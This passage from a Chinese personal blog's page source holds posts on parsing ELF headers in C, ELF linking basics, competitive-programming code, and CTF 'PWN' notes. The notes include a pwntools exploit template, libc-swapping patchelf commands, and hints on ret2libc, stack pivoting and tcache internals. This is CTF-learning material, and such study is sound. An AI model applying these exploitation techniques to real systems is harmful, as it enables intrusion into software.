ELF header解析器&lt;br&gt;
查看&lt;code&gt;elf.h&lt;/code&gt;中有定义&lt;br&gt;
则可以从文件流中读入数据到指针中，进而输出ELF Header信息&lt;br&gt;
以下代码在Windows中编译需要将&lt;code&gt;elf.h&lt;/code&gt;文件复制到&lt;code&gt;/include&lt;/code&gt;目录下&lt;br&gt;
32位与64位在文件头有区别：&lt;img src=&#34;https://oraclepi.tech/post-images/1672930092109.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
64位版本:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf64_Ehdr e64_hd;//参见elf.h定义
    FILE *pt;//定义FILE类型的指针
    pt=freopen(&amp;quot;question_5_x64&amp;quot;,&amp;quot;r&amp;quot;,stdin);//需要判断的文件
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//从文件流读取数据到e64_hd中
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e64_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;截图与&lt;code&gt;readelf -h&lt;/code&gt;对比：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672929898271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;br&gt;
32位版本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf32_Ehdr e32_hd;//参见elf.h定义
    FILE *pt;//定义FILE类型的指针
    pt=freopen(&amp;quot;question_5_x86&amp;quot;,&amp;quot;r&amp;quot;,stdin);//需要判断的文件
    fread(&amp;amp;e32_hd,sizeof(Elf32_Ehdr),1,pt);//从文件流读取数据到e32_hd中
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e32_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e32_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e32_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e32_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e32_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e32_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e32_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e32_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e32_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e32_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;截图与&lt;code&gt;readelf -h&lt;/code&gt;对比：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672930001146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
">PWN phase1</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RVZOEWv6Q/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sp和bp寻址有区别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;平衡栈问题&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1671956912081.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
如&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;ret2libc&lt;/a&gt;及&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;exp&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf8
from pwn import *

context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] #pwndbg适配该终端，加上这句话，我们就可以在一个终端进行分屏调试，分屏的切换一类的操作还需要查看一下tmux如何使用

ip = &#39;&#39;
port = 0
process_name = &#39;&#39;
if args.G:           #还没搞清楚是什么原理，但是用法就是在参数列表中加个G就可以进入本地调试的分支
    sh = process(process_name)
    addr=&#39;&#39;
    gdb.attach(sh, &amp;quot;b *&amp;quot; + addr)  
else:
    sh = remote(ip,port)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;关于`close&#39;&lt;img src=&#34;https://oraclepi.tech/post-images/1672932863356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;exp脚本里面写payload顺序不能错&lt;/li&gt;
&lt;li&gt;system和call _system以及16字节对齐&lt;a href=&#34;https://www.cnblogs.com/kingbridge/articles/15839185.html&#34;&gt;link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;patchelf --set-interpreter  &lt;code&gt;ld* file&lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;patchelf --replace-needed &lt;code&gt;old libc* file    new libc* file &lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;set debug-file-directory  ./.debug/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;recv注意事项：&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/hanqdi_/article/details/107164199?spm=1001.2101.3001.6650.1&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;utm_relevant_index=2&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;栈迁移：&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/109728490&#34;&gt;link&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.freebuf.com/articles/network/340303.html&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwndbg打断点 开启pie的使用 gdb &lt;em&gt;$rebase(0x&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;signin绕过tail ./*&lt;/p&gt;
&lt;p&gt;mp_.tcache_bins怎么找，哈哈，search -8 堆基址，&lt;br&gt;
找到在libc.so上的地址，该地址加8就是mp_.tcache_bins的地址&lt;/p&gt;
">PWN相关</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k_3A9NnKQ/"" data-c="
          &lt;h2&gt;ELF文件(Linux上运行,被统称为object file)&lt;/h2&gt;
&lt;h3&gt;文件类型:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;可执行文件(.exec)&lt;/code&gt;:Linker对.o文件进行处理输出的文件，进程映像&lt;/li&gt;
&lt;li&gt;&lt;code&gt;可重定位文件(.rel)&lt;/code&gt;:编译器和汇编器产生的.o文件，被Linker所处理&lt;/li&gt;
&lt;li&gt;&lt;code&gt;共享目标文件(.dyn)&lt;/code&gt;:动态库文件.so&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;文件组成:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ELF文件头&lt;/strong&gt;:&lt;br&gt;
包含文件基本信息，文件头部存在&lt;code&gt;魔术字符(7f 45 4c 46)&lt;/code&gt;,即字符串&lt;code&gt;\177ELF&lt;/code&gt;，当文件被映射到内存时，可以通过搜索该字符确定映射地址，dump内存时有用&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;#define EI_NIDENT 16
typedef struct{
    /*ELF的一些标识信息，固定值*/
    unsigned char e_ident[EI_NIDENT];
    /*目标文件类型：1-可重定位文件，2-可执行文件，3-共享目标文件等*/
    Elf32_Half e_type;
    /*文件的目标体系结构类型：3-intel 80386*/
    Elf32_Half e_machine;
    /*目标文件版本：1-当前版本*/
    Elf32_Word e_version;
    /*程序入口的虚拟地址，如果没有入口，可为0*/
    Elf32_Addr e_entry;
    /*程序头表(segment header table)的偏移量，如果没有，可为0*/
    Elf32_Off e_phoff;
    /*节区头表(section header table)的偏移量，没有可为0*/
    Elf32_Off e_shoff;
    /*与文件相关的，特定于处理器的标志*/
    Elf32_Word e_flags;
    /*ELF头部的大小，单位字节*/
    Elf32_Half e_ehsize;
    /*程序头表每个表项的大小，单位字节*/
    Elf32_Half e_phentsize;
    /*程序头表表项的个数*/
    Elf32_Half e_phnum;
    /*节区头表每个表项的大小，单位字节*/
    Elf32_Half e_shentsize;
    /*节区头表表项的数目*/
    Elf32_Half e_shnum;
    /*某些节区中包含固定大小的项目，如符号表。对于这类节区，此成员给出每个表项的长度字节数。*/
    Elf32_Half e_shstrndx;
}Elf32_Ehdr;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;节头表(可去以增加反编译器分析难度)&lt;/strong&gt;：&lt;br&gt;
目标文件的节信息保存在节头表，表的每一项都是一个结构体，记录节的名字、长度、偏移、读写权限等信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;可执行文件的装载:&lt;/h3&gt;
&lt;p&gt;详见&lt;a href=&#34;https://zhuanlan.zhihu.com/p/127821301&#34;&gt;知乎专栏&lt;/a&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;静态链接&lt;/h2&gt;
&lt;h3&gt;地址空间分配(将目标链接为可执行文件时)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;按序叠加&lt;br&gt;
当目标文件过多时，输出的可执行文件非常零散，且段的装载地址和空间以页为单位对齐造成内存浪费&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370739153.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相似节合并&lt;br&gt;
将不同目标文件的相同属性的节合并为一个节&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370746247.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;静态链接过程&lt;/h3&gt;
&lt;p&gt;符号解析(符号的引用与其定义相关联)&lt;br&gt;
重定位(将符号的定义与内存地址相关联，然后修改其引用，使其指向这些内存地址)&lt;/p&gt;
&lt;h3&gt;静态链接库&lt;/h3&gt;
&lt;p&gt;&lt;s&gt;类似CPP头文件&lt;/s&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;动态链接&lt;/h2&gt;
&lt;p&gt;在运行或装载时，在内存中完成链接的过程&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665371493342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3&gt;位置无关代码&lt;/h3&gt;
&lt;p&gt;地址无关代码(英文: position-independent code，缩写为&lt;code&gt;PIC&lt;/code&gt;)，又称地址无关可执行文件(英文:&lt;br&gt;
position-independent executable，缩写为&lt;code&gt;PIE&lt;/code&gt;) ，是指可在主存储器中任意位置正确地运行，&lt;br&gt;
而不受其绝对地址影响的一种机器码&lt;/p&gt;
&lt;h3&gt;延迟绑定&lt;h3&gt;
&lt;p&gt;延迟绑定(Lazy Binding)是动态链接器用来减少程序启动时间的一种技术。 延迟绑定就是在函数第一次被调用的时候再和函数地址绑定。&lt;/p&gt;
">PWN篇-二进制文件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/about/"" data-c="
          &lt;p&gt;啥也不会&lt;br&gt;
member of ChaMd5&lt;/p&gt;
&lt;p&gt;cXElM0E5MTg1Njk2MTM=&lt;/p&gt;
">ABout</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xian-duan-shu-wei-hu-qu-jian-zui-zhi-wen-ti/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;题面&lt;/strong&gt;&lt;br&gt;
给定给定含n个数的数组A[N],求区间[L,R]的和&lt;br&gt;
数组个数为n,q次查询区间l,r;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数据范围&lt;/strong&gt;&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=n&amp;lt;=10^5,1&amp;lt;=L,R&amp;lt;=n,0&amp;lt;a[i]&amp;lt;10^3&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.008548em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8388800000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=Q&amp;lt;=10^5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define ll long long
#define lc num&amp;lt;&amp;lt;1
#define rc num&amp;lt;&amp;lt;1|1
#define N 100001
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
int n,l,r,q;
ll a[N];
struct node{
    int l,r,num;
    ll val,add;
}tre[N*4];
void pushup(int num)
{
    tre[num].val=max(tre[lc].val,tre[rc].val);
}
void build_tre(int l,int r,int num)
{
    tre[num].l=l;tre[num].r=r;
    if(l==r)
    {
        tre[num].val=a[l];
        return ;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    build_tre(l,mid,lc);
    build_tre(mid+1,r,rc);
    pushup(num);
}
ll query_itv(int l,int r,int num)
{
    ll ans=-0x3f;
    if(tre[num].l&amp;gt;=l&amp;amp;&amp;amp;tre[num].r&amp;lt;=r)
    {
        return tre[num].val;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    if(l&amp;lt;=mid) ans=max(ans,query_itv(l,r,lc));
    if(r&amp;gt;mid) ans=max(ans,query_itv(l,r,rc));
    return ans;
}

signed main()
{
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
    for(int i=1;i&amp;lt;=n;i++)
    {
        scanf(&amp;quot;%lld&amp;quot;,&amp;amp;a[i]);
    }
    build_tre(1,n,1);
